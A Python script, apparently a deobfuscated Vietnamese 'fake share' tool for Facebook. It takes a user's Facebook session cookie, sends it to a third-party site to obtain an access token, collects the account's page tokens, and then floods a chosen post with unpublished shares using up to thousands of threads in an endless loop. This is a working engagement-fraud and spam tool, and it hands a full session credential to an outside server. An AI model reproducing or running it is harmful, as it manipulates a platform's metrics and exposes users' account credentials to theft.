import requests
#Deobfuscator by HuyAnh
#Zalo:0905491417
#fb.com/huyanhnong.21
import random

import threading

import os



list_token = []



# =========================== [ CLASS + FUNCTION TOOL ] ===========================



def banner():

    os.system("cls" if os.name == "nt" else "clear")

    os.system('title TOOL SHARE ẢO MAX SPEED - ZYTH')

    banner = '''

\033[1;32m            ███████╗██╗   ██╗████████╗██╗  ██╗

\033[1;32m            ╚══███╔╝╚██╗ ██╔╝╚══██╔══╝██║  ██║

\033[1;32m              ███╔╝  ╚████╔╝    ██║   ███████║

\033[1;32m             ███╔╝    ╚██╔╝     ██║   ██╔══██║

\033[1;32m            ███████╗   ██║      ██║   ██║  ██║

\033[1;32m            ╚══════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ SHARE ẢO ĐA LUỒNG MAX SPEED

\033[1;39m              ⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦

\033[1;32m Nguyễn Ngọc Thành                  DevOps: Lê Trọng Truyền

\033[1;39m              ⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦

    '''

    print(banner)



class NguyenDucPhatCuteVcl:

    def gettoken(self, cookie):

        json_info = requests.get('https://firet.io/firetx_retro/api/getthongtinck.php?cookie='+cookie).json()

        if json_info['status'] == 'success':

            return json_info

        else:

            return False



    def getpage(self, token):

        try:

            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']

            if len(json_get) != 0:

                return json_get

            else: 

                return False

        except:

            return False



    def run_share(self, tokenpage, id_post):

        try:

            rq_url = random.choice([requests.get, requests.post])

            sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()

            if 'id' in sharepost:

                idshare = sharepost['id']

                print(f'[ZYTH] | \033[1;32m[ID Bài VIẾT: {idshare}] | \033[1;33mTHÀNH CÔNG ')

            else:

                print('[ZYTH] |  \033[1;31mLỖI, PAGE CỦA BẠN ĐÃ BỊ BLOCK !!')

        except:

            pass



# =========================== [ START TOOL ] ===========================

banner()



while True:

    cookie = input('\033[1;31mVUI LÒNG NHẬP COOKIE NICK FACEBOOK CHỨA PAGE: \033[1;35m')

    dpcute = NguyenDucPhatCuteVcl()

    checklive = dpcute.gettoken(cookie)

    if checklive != False:

        token = checklive['token']

        name  = checklive['name']

        uid   = checklive['id']

        print('─'*50)

        print(f'\033[1;35mNAME FACEBOOK: {name} | \033[1;33mID FB: {uid}')

        print('─'*50)

        break

    else:

        print('\033[1;32mCookie Die HOẶC Lỗi Vui Lòng Thử Lại Lại!!')

        continue



id_post = input('\033[1;31mLink Bài Viết: ')

print('─'*50)

luong = int(input('\033[1;37mVUI LÒNG NHẬP SỐ LUỒNG (100-10000 tùy chọn): '))

print('─'*50)

getpage = dpcute.getpage(token)

if getpage != False:

    print(f'Đã Tìm Thấy | {len(getpage)} | Page + Pro5', end='\r')

    for getdl in getpage:

        tokenpagegett = getdl['access_token']

        list_token.append(tokenpagegett)

else:

    print('1;62mKhông Tìm Thấy Page Nào!!')



while True:

    for tokenpage in list_token:

        t = threading.Thread(target=dpcute.run_share, args=(tokenpage, id_post))

        t.start()

        while threading.active_count() > luong:

            t.join()

